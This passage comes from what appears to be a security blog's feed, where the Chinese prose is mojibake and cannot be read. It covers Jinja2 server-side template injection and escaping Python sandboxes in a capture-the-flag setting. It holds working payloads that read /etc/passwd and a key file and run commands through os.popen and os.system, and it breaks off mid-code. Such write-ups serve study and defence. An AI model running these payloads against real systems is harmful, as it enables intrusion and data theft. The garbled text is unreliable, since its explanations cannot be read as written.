ï¼š<code>https://www.freebuf.com/articles/web/98928.html</code></p><p>ä¸ªäººç›´æ¥ç†è§£å°±æ˜¯<code>__mro__</code>ä¼šè¾“å‡ºå½“å‰å¯¹è±¡æ‰€è°ƒç”¨çš„å…¨éƒ¨ç±»åŒ…æ‹¬å…¶çˆ¶ç±»ï¼Œè€Œ<code>__subclasses__</code>ä¼šè¾“å‡ºè¯¥ç±»ä¸‹æ‰€æœ‰çš„å­ç±»ã€‚OKï¼Œè¿™æ ·å°±å¯ä»¥æ„‰å¿«çš„å¼€å§‹äº†</p><p>å…ˆæ¥æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å­˜åœ¨è¿™ä¸ªæ¼æ´ï¼Œè¾“å…¥å‚æ•°<code>25hello</code>ï¼Œæ˜æ˜¾å­˜åœ¨æ¼æ´</p><p><img src="https://s2.ax1x.com/2019/02/07/ktfbPU.png" alt="ktfbPU.png"></p><p>é¦–å…ˆæˆ‘ä»¬è¦åšçš„ç¬¬ä¸€ä»¶äº‹ä¾¿æ˜¯é€‰æ‹©ä¸€ä¸ªnew-style objectç”¨äºè®¿é—®<code>object</code>åŸºç±»ã€‚å¯ä»¥ç®€å•çš„ä½¿ç”¨<code>&#39;&#39;</code>ï¼Œä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼Œ<code>str</code>å¯¹è±¡ç±»å‹ã€‚ä¹‹åå¯ä»¥ä½¿ç”¨<code>__mro__</code>å±æ€§è®¿é—®å¯¹è±¡çš„ç»§æ‰¿ç±»ã€‚å°†<code></code>ä½œä¸ºpayloadæ³¨å…¥åˆ°å­˜åœ¨SSTIæ¼æ´çš„é¡µé¢ä¸­</p><p><img src="https://s2.ax1x.com/2019/02/07/ktYYQJ.png" alt="ktYYQJ.png"></p><p>å‡ºç°ä¸¤ä¸ªç±»ï¼Œé€‰æ‹©ç¬¬äºŒä¸ªobjectåŸºç±»ï¼Œå¹¶æ˜¾ç¤ºè¯¥ç±»ä¸‹æ–¹çš„æ‰€æœ‰å­ç±»ï¼Œæ³¨å…¥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[1].__subclasses__() &#125;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/07/ktYReI.png" alt="ktYReI.png"></p><p>ä¸Šé¢é“¾æ¥çš„æ–‡ç« é‡Œé¢ä½¿ç”¨fileç±»å»è¿›è¡Œå¯¹æ–‡ä»¶çš„è¯»å†™æ“ä½œï¼Œpayload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure></p><p>ä½†æ˜¯fileæ–¹æ³•åœ¨py3ä¸­å·²ç»ä¸æ”¯æŒï¼Œåªè¦æ‰¾åˆ°å¯ä»¥æ‰§è¡Œä»£ç çš„å‡½æ•°æˆ–è€…å…¶ä»–è¯»æ–‡ä»¶çš„å‡½æ•°éƒ½å¯ä»¥ï¼Œåœ¨vulhubä¸Šæ‰¾åˆ°çš„å¦å¤–ä¸€ä¸ªé€‚åˆpy3çš„ï¼Œåˆ©ç”¨äº†evalå‡½æ•°å»å®ç°RCEçš„åŠŸèƒ½ï¼Œå› ä¸ºæ‰§è¡Œè¯­å¥å»å®ç°çš„ï¼Œæ‰€ä»¥å¾—ç”¨%æ‹¬ä½ã€‚æ–¹æ³•ä¸æ­¢ä¸€ç§ï¼Œæ‰¾åˆ°å¯¹çš„ç»§æ‰¿é“¾å°±å¯ä»¥ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &apos;eval&apos; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&apos;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/07/ktNZbn.png" alt="ktNZbn.png"></p><p>æˆåŠŸè¯»å–æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶</p><p><img src="https://s2.ax1x.com/2019/02/07/ktNMCT.png" alt="ktNMCT.png"></p><p>å¦å¤–å†æ‹¿</p><p>è¿™ä¸œè¥¿åªè¦æ‰¾å¯¹ç»§æ‰¿å…³ç³»ï¼Œè€Œä¸”ç»§æ‰¿å…³ç³»é‡Œé¢çš„æ–¹æ³•æ¸…æ¥šçš„è¯å°±å¾ˆå¿«è·å¾—æ•ˆæœï¼Œå½“ç„¶é˜²èŒƒçš„è¯å¾—ä»ä»£ç å±‚ä¸‹æ‰‹ï¼Œæ°¸è¿œä¸è¦ç›¸ä¿¡ç”¨æˆ·çš„è¾“å…¥å°±å¯¹äº†ï¼Œå¯¹å¯æ§å˜é‡åšå¥½é˜²å¾¡XD</p><p>å‚è€ƒæ–‡ç« :</p><p><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf</a></p><p><a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/83999.html</a></p><p><a href="https://www.freebuf.com/articles/web/98928.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/98928.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;å…ˆå…¥ä¸ªé—¨&quot;&gt;&lt;a href=&quot;#å…ˆå…¥ä¸ªé—¨&quot; class=&quot;headerlink&quot; title=&quot;å…ˆå…¥ä¸ªé—¨&quot;&gt;&lt;/a&gt;å…ˆå…¥ä¸ªé—¨&lt;/h3&gt;&lt;h4 id=&quot;Jimja2&quot;&gt;&lt;a href=&quot;#Jimja2&quot; class=&quot;headerlink&quot; title=&quot;Jimja2&quot;&gt;&lt;/a&gt;Jimja2&lt;/h4&gt;&lt;p&gt;&lt;code&gt;Jinja2&lt;/code&gt;æ˜¯é»˜è®¤çš„ä»¿&lt;code&gt;Django&lt;/code&gt;æ¨¡æ¿çš„ä¸€ä¸ªæ¨¡æ¿å¼•æ“ï¼Œç”±&lt;code&gt;Flask&lt;/code&gt;çš„ä½œè€…å¼€å‘ã€‚ç½‘ä¸Šæœçš„è¯­æ³•
    
    </summary>
    
      <category term="SSTIæ³¨å…¥" scheme="0verwatch.top/categories/SSTI%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SSTIæ³¨å…¥" scheme="0verwatch.top/tags/SSTI%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Pythonæ²™ç›’ç»•è¿‡</title>
    <link href="0verwatch.top/python-sandbox-bypass.html"/>
    <id>0verwatch.top/python-sandbox-bypass.html</id>
    <published>2019-02-04T08:28:00.000Z</published>
    <updated>2019-02-08T10:20:31.385Z</updated>
    
    <content type="html"><![CDATA[<h3 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h3><p>ä¸€äº›å‡½æ•°éœ€è¦äº†è§£ä¸€ä¸‹ï¼Œè¿™ç¯‡æ–‡ç« è®²çš„å·²ç»å¾ˆè¯¦ç»†<a id="more"></a>äº†:<a href="https://xz.aliyun.com/t/2308#toc-12ï¼Œæ¦‚æ‹¬ä¸€ä¸‹åˆ†åˆ«æ˜¯ä¸‹é¢çš„å‡½æ•°" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308#toc-12ï¼Œæ¦‚æ‹¬ä¸€ä¸‹åˆ†åˆ«æ˜¯ä¸‹é¢çš„å‡½æ•°</a></p><ul><li><code>__class__</code> :è¿”å›ä¸€ä¸ªå®ä¾‹æ‰€å±çš„ç±»</li><li><code>__bases__</code> :è¿”å›ä¸€ä¸ªç±»<code>ç›´æ¥</code>æ‰€ç»§æ‰¿çš„ç±»ï¼ˆå…ƒç»„å½¢å¼ï¼‰</li><li><code>__mro__</code> :åˆ—å‡ºè§£ææ–¹æ³•çš„è°ƒç”¨é¡ºåºï¼Œç±»ä¼¼äºbases</li><li><code>__subclasses__()</code>ï¼šè¿”å›å­ç±»åˆ—è¡¨</li><li><code>__dict__</code> ï¼š åˆ—å‡ºå½“å‰å±æ€§/å‡½æ•°çš„å­—å…¸</li><li><code>func_globals</code>ï¼šè¿”å›ä¸€ä¸ªåŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸å¼•ç”¨</li><li><code>__globals__</code>:è¿”å›ä¸€ä¸ªå½“å‰ç©ºé—´ä¸‹èƒ½ä½¿ç”¨çš„æ¨¡å—ï¼Œæ–¹æ³•å’Œå˜é‡çš„å­—å…¸</li></ul><p>ä¸Šé¢çš„æ¨¡å—ä¸­å¯ä»¥å°è¯•ç†è§£mroå’Œbasesä¹‹é—´çš„åŒºåˆ«ï¼Œä¸¤ä¸ªçš„ä¸œè¥¿è¿˜æ˜¯æœ‰ç‚¹åŒºåˆ«çš„ï¼Œåªæ˜¯ä½œç”¨åœ¨ç»•è¿‡ä¸ŠåŠŸèƒ½ç±»ä¼¼ã€‚ä¸ªäººæ„Ÿè§‰mroçš„å‘å±•è¿‡ç¨‹æœ‰ç‚¹åƒä»dfsç¼–ç¨‹bfsã€‚ã€‚ã€‚</p><h3 id="diræ–¹æ³•"><a href="#diræ–¹æ³•" class="headerlink" title="diræ–¹æ³•"></a>diræ–¹æ³•</h3><ul><li>dir()åœ¨æ²¡æœ‰å‚æ•°çš„æ—¶å€™è¿”å›æœ¬åœ°ä½œç”¨åŸŸä¸­çš„åç§°åˆ—è¡¨</li><li>dir()åœ¨æœ‰å‚æ•°çš„æ—¶å€™è¿”å›è¯¥å¯¹è±¡çš„æœ‰æ•ˆå±æ€§åˆ—è¡¨</li></ul><p>å¯¹æ¯”ä¸€ä¸‹ä¸‹é¢çš„ä¾‹å­å°±çŸ¥é“äº†ï¼Œä»¥py2ä¸ºä¾‹ï¼š</p><p><img src="https://s2.ax1x.com/2019/02/07/ktIJLd.png" alt="ktIJLd.png"></p><h3 id="å†…è”æ¨¡å—"><a href="#å†…è”æ¨¡å—" class="headerlink" title="å†…è”æ¨¡å—"></a>å†…è”æ¨¡å—</h3><p>pythonä¸­å¯ä»¥ç›´æ¥è¿è¡Œä¸€äº›å‡½æ•°ï¼Œä¾‹å¦‚<code>int(),list()</code>ç­‰ç­‰ã€‚è¿™äº›å‡½æ•°å¯ä»¥åœ¨å†…è”æ¨¡å—ä¸­å¯ä»¥æŸ¥åˆ°ã€‚</p><p>å¸¸ç”¨çš„æœ‰ä¸‹é¢ä¸¤ä¸ªï¼š<code>__import__</code>ä»¥åŠ<code>__builtins__</code>ï¼Œä½†æ˜¯åœ¨py2é‡Œé¢å†…ç½®æ¨¡å—åå­—å«<code>__builtin__</code>ï¼Œpy3æ”¹åå«<code>__builtins__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python 2.7</span></span><br><span class="line">In [<span class="number">4</span>]: __builtin__</span><br><span class="line">Out[<span class="number">4</span>]: &lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: __builtins__</span><br><span class="line">Out[<span class="number">5</span>]: &lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="comment">#python 3.6</span></span><br><span class="line">In [<span class="number">2</span>]: __builtin__                                                                                             </span><br><span class="line">Out[<span class="number">2</span>]: &lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: __builtins__                                                                                    </span><br><span class="line">Out[<span class="number">3</span>]: &lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure><p>åœ¨py2ä¸­ï¼Œåœ¨ä¸»æ¨¡å—<code>main</code>ä¸­ï¼Œ<code>__builtins__</code>æ˜¯å¯¹å†…å»ºæ¨¡å—<code>__builtin__</code>æœ¬èº«çš„å¼•ç”¨ï¼Œå³<code>__builtins__</code>å®Œå…¨ç­‰ä»·äº<code>__builtin__</code>ï¼ŒäºŒè€…å®Œå…¨æ˜¯ä¸€ä¸ªä¸œè¥¿ï¼Œä¸åˆ†å½¼æ­¤ã€‚</p><p>éä¸»æ¨¡å—<code>main</code>ä¸­ï¼Œ<code>__builtins__</code>ä»…æ˜¯å¯¹<code>__builtin__.__dict__</code>çš„å¼•ç”¨ï¼Œè€Œé<code>__builtin__</code>æœ¬èº«</p><h3 id="æ³¨æ„ï¼š"><a href="#æ³¨æ„ï¼š" class="headerlink" title="æ³¨æ„ï¼š"></a>æ³¨æ„ï¼š</h3><p>å¦‚æœå¯¼å…¥çš„æ¨¡å—aä¸­æœ‰ç€å¦ä¸€ä¸ªæ¨¡å—bï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code>a.b</code>çš„æ–¹æ³•æˆ–è€…<code>a.__dict__[b&lt;name&gt;]</code>çš„æ–¹æ³•é—´æ¥è®¿é—®æ¨¡å—bã€‚</p><h3 id="å¼„ä¸€ä¸ªæ²™ç›’ç¯å¢ƒ"><a href="#å¼„ä¸€ä¸ªæ²™ç›’ç¯å¢ƒ" class="headerlink" title="å¼„ä¸€ä¸ªæ²™ç›’ç¯å¢ƒ"></a>å¼„ä¸€ä¸ªæ²™ç›’ç¯å¢ƒ</h3><p>ä¸€èˆ¬è¯»å–ç›®å½•çš„æ—¶å€™éœ€è¦ä½¿ç”¨åˆ°<code>os.system</code>å‡½æ•°ï¼Œè¿™æ ·çš„ä¸€å¥è¯è¿™æ ·å†™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">'os'</span>).system(<span class="string">'dir'</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å¯ä»¥æŠŠä¸€äº›å…³é”®æ¨¡å—ç»™åˆ æ‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'__import__'</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'eval'</span>]</span><br><span class="line"><span class="comment"># ç®¡ç†å‘˜åˆ äº†å¾ˆå¤šçš„å±é™©å‡½æ•°</span></span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'...'</span>]</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™importå·²ç»å¤±æ•ˆäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: __import__ <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¯ä»¥ç”¨ reloadæ¥é‡æ–°å¯¼å…¥æ¨¡å—ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¯·æ³¨æ„ï¼Œåœ¨<strong>Python 3.0æŠŠreloadå†…ç½®å‡½æ•°ç§»åˆ°äº†importåº“æ¨¡å—ä¸­ã€‚</strong>æ‰€ä»¥python3ä¸­ï¼Œè¿™ä¸ªæ–¹æ³•å·²ç»å¤±æ•ˆäº†</p><p>æ‰€ä»¥åœ¨åˆ¶ä½œpy2.7æ²™ç®±çš„æ—¶å€™ï¼Œè¿˜éœ€è¦åˆ é™¤<code>reload</code>çš„æ–¹æ³•ã€‚</p><h3 id="ä¸€é“é¢˜ç›®"><a href="#ä¸€é“é¢˜ç›®" class="headerlink" title="ä¸€é“é¢˜ç›®"></a>ä¸€é“é¢˜ç›®</h3><p>è¿™ä¸ªé¢˜ç›®å¾ˆå¸¸è§äº†ï¼Œpy2çš„ç¯å¢ƒï¼Œè‡ªå·±æ‹¿æ¥ç»ƒä¸‹æ‰‹,æœ€åæ˜¯è¯»å–å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„keyæ–‡ä»¶ï¼Œåˆ é™¤äº†å¾ˆå¤šå…³é”®å‡½æ•°ï¼Œä¹ŸåŒ…æ‹¬äº†<code>reload</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_secure</span><span class="params">()</span>:</span></span><br><span class="line">    UNSAFE = [<span class="string">'open'</span>,</span><br><span class="line">              <span class="string">'file'</span>,</span><br><span class="line">              <span class="string">'execfile'</span>,</span><br><span class="line">              <span class="string">'compile'</span>,</span><br><span class="line">              <span class="string">'reload'</span>,</span><br><span class="line">              <span class="string">'__import__'</span>,</span><br><span class="line">              <span class="string">'eval'</span>,</span><br><span class="line">              <span class="string">'input'</span>]</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> UNSAFE:</span><br><span class="line">        <span class="keyword">del</span> __builtins__.__dict__[func]</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"><span class="comment"># Remove dangerous builtins</span></span><br><span class="line">make_secure()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Go Ahead, Expoit me &gt;;D'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Read user input until the first whitespace character</span></span><br><span class="line">        inp = findall(<span class="string">'S+'</span>, raw_input())[<span class="number">0</span>]</span><br><span class="line">        a = <span class="keyword">None</span></span><br><span class="line">        <span class="comment"># Set a to the result from executing the user input</span></span><br><span class="line">        <span class="keyword">exec</span> <span class="string">'a='</span> + inp</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Return Value:'</span>, a</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Exception:'</span>, e</span><br></pre></td></tr></table></figure><h4 id="ç”¨fileç±»å»è¯»å–æ–‡ä»¶"><a href="#ç”¨fileç±»å»è¯»å–æ–‡ä»¶" class="headerlink" title="ç”¨fileç±»å»è¯»å–æ–‡ä»¶"></a>ç”¨fileç±»å»è¯»å–æ–‡ä»¶</h4><p>é¢å¯¹è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å·²ç»ä¸èƒ½ä½¿ç”¨<code>__import__(&#39;os&#39;).system(&#39;dir&#39;)</code>å»è¯»å–æ–‡ä»¶ä½†æˆ‘ä»¬å¯ä»¥åˆ©ç”¨objectç±»å»å¯»æ‰¾fileç±»å»è¯»å–æ–‡ä»¶å†…å®¹</p><p>æ€è·¯æ˜¯è¿™æ ·çš„ï¼š</p><ol><li>éšä¾¿æ‰¾ä¸€ä¸ªå†…ç½®ç±»å¯¹è±¡ç”¨<code>__class__</code>æ‹¿åˆ°ä»–æ‰€å¯¹åº”çš„ç±»</li><li>ç”¨<code>__bases__</code>æ‹¿åˆ°åŸºç±»ï¼ˆ<code>&lt;class &#39;object&#39;&gt;</code>ï¼‰</li><li>ç”¨<code>__subclasses__()</code>æ‹¿åˆ°å­ç±»åˆ—è¡¨</li><li>åœ¨å­ç±»åˆ—è¡¨ä¸­ç›´æ¥å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„ç±»</li></ol><p>ä¹Ÿå°±æ˜¯</p><p><code>().__class__.__bases__[0].__subclasses__()[40]</code></p><p>ä½†æ˜¯é¢å¯¹<code>__subclasses__</code>çš„å­ç±»å¤ªå¤šæ‰¾ä¸åˆ°å¯¹åº”çš„fileç±»æ€ä¹ˆåŠï¼Ÿå¯ä»¥è¿™æ ·å»å¯»æ‰¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">'file'</span>   <span class="comment">#è¿™é‡Œå¡«å†™ä½ è¦å¯»æ‰¾çš„ç±»å³å¯</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">in</span> str(i):</span><br><span class="line">        <span class="keyword">print</span> num</span><br><span class="line">    num += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>ç„¶åå¯ä»¥ç”¨dirå‡½æ•°æŸ¥çœ‹é‡Œé¢çš„æ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__enter__'</span>, <span class="string">'__exit__'</span>, <span class="string">'__format__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__iter__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'close'</span>, <span class="string">'closed'</span>, <span class="string">'encoding'</span>, <span class="string">'errors'</span>, <span class="string">'fileno'</span>, <span class="string">'flush'</span>, <span class="string">'isatty'</span>, <span class="string">'mode'</span>, <span class="string">'name'</span>, <span class="string">'newlines'</span>, <span class="string">'next'</span>, <span class="string">'read'</span>, <span class="string">'readinto'</span>, <span class="string">'readline'</span>, <span class="string">'readlines'</span>, <span class="string">'seek'</span>, <span class="string">'softspace'</span>, <span class="string">'tell'</span>, <span class="string">'truncate'</span>, <span class="string">'write'</span>, <span class="string">'writelines'</span>, <span class="string">'xreadlines'</span>]</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æœ€åçš„payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'./key'</span>).read()</span><br><span class="line"><span class="comment">#åŒæ ·çš„æ•ˆæœ</span></span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'./key'</span>).read()</span><br></pre></td></tr></table></figure><p>ç­‰ä»·äº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(<span class="string">'./key'</span>).read()</span><br></pre></td></tr></table></figure><p>æ³¨æ„py3å·²ç»ç§»é™¤äº†fileäº†è¿™ç§æ–¹æ³•ä¹Ÿåªèƒ½åœ¨py3é‡Œé¢ä½¿ç”¨</p><h4 id="åˆ©ç”¨å†…ç½®å‡½æ•°æ‰§è¡Œå‘½ä»¤"><a href="#åˆ©ç”¨å†…ç½®å‡½æ•°æ‰§è¡Œå‘½ä»¤" class="headerlink" title="åˆ©ç”¨å†…ç½®å‡½æ•°æ‰§è¡Œå‘½ä»¤"></a>åˆ©ç”¨å†…ç½®å‡½æ•°æ‰§è¡Œå‘½ä»¤</h4><p>å¯ä»¥æ ¹æ®ç¬¬ä¸€ç§çš„æ€è·¯æ¥ç€æ¢ç´¢ã€‚ç¬¬ä¸€ç§æ­¢æ­¥äºæŠŠå†…ç½®çš„å¯¹è±¡åˆ—ä¸¾å‡ºæ¥ï¼Œå…¶å®å¯ä»¥ç”¨<code>__globals__</code>æ›´æ·±å…¥çš„å»çœ‹æ¯ä¸ªç±»å¯ä»¥è°ƒç”¨çš„ä¸œè¥¿ï¼ˆåŒ…æ‹¬æ¨¡å—ï¼Œç±»ï¼Œå˜é‡ç­‰ç­‰ï¼‰ï¼ŒæŸ¥æ‰¾<code>os</code>æ¨¡å—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">'os'</span>   <span class="comment">#ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ä½ æƒ³åˆ©ç”¨çš„æ¨¡å—</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span> </span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">(&lt;class 'site._Printer'&gt;, 71)</span></span><br><span class="line"><span class="string">(&lt;class 'site.Quitter'&gt;, 76)</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>ç„¶åæ„é€ ç»§æ‰¿é“¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'whoami'</span>)</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸ªæ–¹æ³•ä¹Ÿåªèƒ½åœ¨py2é‡Œé¢å®ç°ï¼ŒåŒæ ·åœ¨å‰é¢çš„SSTIæ³¨å…¥ä¸­vulhubç»™çš„æµ‹è¯•payloadç”¨çš„æ˜¯<code>class &#39;warnings.catch_warnings&#39;</code>è¿™ä¸€ä¸ªç±»ï¼ŒåŒæ ·è¿™ä¸ªç±»é‡Œé¢ä¹Ÿæœ‰osæ¨¡å—ï¼Œå¯ä»¥åƒä¸‹é¢è¿™ä¸ªæ ·å­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 